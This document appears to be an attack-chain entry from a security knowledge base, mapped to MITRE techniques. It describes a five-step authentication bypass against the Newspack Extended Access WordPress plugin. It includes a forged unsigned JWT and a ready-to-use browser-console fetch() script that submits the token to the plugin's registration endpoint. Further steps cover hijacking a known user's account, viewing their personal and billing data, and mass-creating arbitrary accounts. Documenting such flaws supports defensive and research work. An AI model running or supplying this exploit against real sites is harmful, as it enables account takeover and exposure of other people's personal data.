---
id: ac-001
tags:
  - auth-bypass
  - jwt
  - wordpress
  - plugin-vuln
  - account-hijack
type: attack_chain
tools:
  - '[[tools/token-dev]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - WordPress
submitted: true
complexity: medium
created_at: '2024-01-01T00:00:00Z'
procedures:
  - '[[procedures/Ensure-Unauthenticated-State]]'
  - '[[procedures/Generate-Unsigned-JWT-Token]]'
  - '[[procedures/Submit-JWT-to-Registration-Endpoint]]'
  - '[[procedures/Verify-Account-Hijack]]'
  - '[[procedures/Create-Arbitrary-User-Account]]'
step_count: 5
techniques:
  - '[[Valid Accounts]]'
  - '[[Create Account]]'
updated_at: '2025-12-14T17:31:42.877Z'
description: >-
  Multi-stage attack exploiting the lack of JWT signature validation in the
  Newspack Extended Access WordPress plugin to bypass authentication and hijack
  user accounts or create arbitrary new ones.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Create Account]]'
---
# Authentication and Registration Bypass via Unsigned JWT in Newspack Extended Access Plugin

Multi-stage attack chain demonstrating a complete attack workflow exploiting the Newspack Extended Access plugin's failure to validate JWT signatures, allowing attackers to authenticate as existing users or create new accounts with arbitrary details.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Ensure Unauthenticated] --> B[Generate Unsigned JWT]
    B --> C[Submit JWT to Endpoint]
    C --> D[Verify Hijack]
    D --> E[Optional: Create New Account]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#9b59b6
```

## Prerequisites & Requirements

### Required Tools

- [[tools/token-dev]]

### Target Environment

- WordPress site with Newspack Extended Access plugin enabled
- WooCommerce and WC Memberships (common integration)
- Web browser for execution

### Initial Access Requirements

- Network access to the target WordPress site
- Knowledge of target user's email (for hijack) or arbitrary details (for creation)
- No prior credentials needed

## Detailed Attack Procedures

### Step 1: Ensure Unauthenticated State
procedure: [[procedures/Ensure-Unauthenticated-State]]

**Objective**: Simulate an unauthenticated attacker by logging out of the target site.

**Instructions**: Manually log out from the WordPress site or clear browser session cookies to ensure no active authentication.

**Expected Output**: No user session active; login prompt visible if attempting access to protected areas.

**Success Indicators**:
- Browser shows unauthenticated state
- No personal data visible

### Step 2: Generate Unsigned JWT Token
procedure: [[procedures/Generate-Unsigned-JWT-Token]]

**Objective**: Craft an unsigned JWT containing the target user's email or arbitrary details.

**Instructions**: Use [[tools/token-dev]] to create a JWT payload with the email field set to the target's email (e.g., 'target@example.org'). Do not sign the token; copy the resulting string.

**Expected Output**: Unsigned JWT token string, e.g., "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZW1haWwiOiJ0YXJnZXRAZXhhbXBsZS5vcmciLCJpYXQiOjE3MTM2NjY2NDksImV4cCI6MTcxMzY3MDI0OX0.invalid_signature".

**Success Indicators**:
- Token generated without errors
- Payload decodes to include target email

### Step 3: Submit JWT to Registration Endpoint
procedure: [[procedures/Submit-JWT-to-Registration-Endpoint]]

**Objective**: Send the crafted JWT to the plugin's endpoint to bypass authentication.

**Instructions**: Open the browser console on the target site and execute [[commands/submit-jwt-via-browser-console]] with the generated token:

```javascript
// Endpoint URL
let url = `${window.location.protocol}//${window.location.hostname}/wp-json/newspack-extended-access/v1/google/register`;
// JWT contents - this JWT contains email "target@example.org".
let token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZW1haWwiOiJ0YXJnZXRAZXhhbXBsZS5vcmciLCJpYXQiOjE3MTM2NjY2NDksImV4cCI6MTcxMzY3MDI0OX0.invalid";
// Provide token to authentication endpoint.
fetch(
 url,
 {
  cache: 'no-store',
  method: 'POST',
  headers: {
   'Content-type': 'text/plain',
  },
  body: token
 }
).then(response => {
 console.log(response.json(), 'response');
})
```

**Expected Output**: JSON response indicating successful registration/authentication; no errors.

**Success Indicators**:
- 200 OK response
- Console logs success message

### Step 4: Verify Account Hijack
procedure: [[procedures/Verify-Account-Hijack]]

**Objective**: Confirm access to the target account's data post-authentication.

**Instructions**: After submission, navigate to protected areas like account dashboard or profile to check visibility of target-specific data.

**Expected Output**: Access to personal details such as billing address and account info belonging to the target user.

**Success Indicators**:
- Logged in as target user
- Sensitive data exposed

### Step 5: Create Arbitrary User Account
procedure: [[procedures/Create-Arbitrary-User-Account]]

**Objective**: Use the same endpoint to register a new account with untrusted details, potentially for persistence or DoS.

**Instructions**: Repeat Step 3 with a new unsigned JWT containing arbitrary email and details (e.g., assign 'Customer' role).

**Expected Output**: New user account created without validation; admin-visible malicious data.

**Success Indicators**:
- New account exists in WordPress users
- Potential for multiple creations leading to DoS

## Attack Chain Summary

### Key Achievements

1. Bypassed JWT validation to authenticate as any known user
2. Hijacked account exposing personal data
3. Created arbitrary accounts injecting untrusted data

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]] Valid Accounts
- [[Create Account]] Create Account

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access

---

*Last updated: 2024-01-01T00:00:00Z*
